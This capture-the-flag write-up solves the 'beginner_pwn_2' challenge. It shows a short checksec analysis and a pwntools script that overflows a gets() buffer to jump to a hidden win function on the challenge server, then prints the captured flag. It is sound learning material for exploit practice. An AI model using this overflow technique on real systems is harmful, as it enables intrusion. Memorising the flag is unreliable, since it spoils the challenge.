https://ctftime.org/event/2573

# beginner_pwn_2 (pwn)

In this challenge there is a function which is not called. Can you fix that?

nc chals.swampctf.com 40001

## Analysis

```bash
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

`main` @ `0x401228`:

- Calls `gets(local_12)`

`win` @ `0x401186`:

- Prints the flag

## Solution

1) ret2win

```python
#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./binary", checksec=False)
context.binary = elf

#p = elf.process()
#p = elf.debug(gdbscript="")
p = remote("chals.swampctf.com", 40001)

payload = b""
payload += b"A" * 0x12
payload += p64(elf.sym["win"])
p.sendline(payload)

p.readuntil(b"swampCTF{")

print("swampCTF{" + p.readuntil(b"}").decode()) # swampCTF{1t5_t1m3_t0_r3turn!!}
```

## Flag
`swampCTF{1t5_t1m3_t0_r3turn!!}`

smiley 2025/03/29
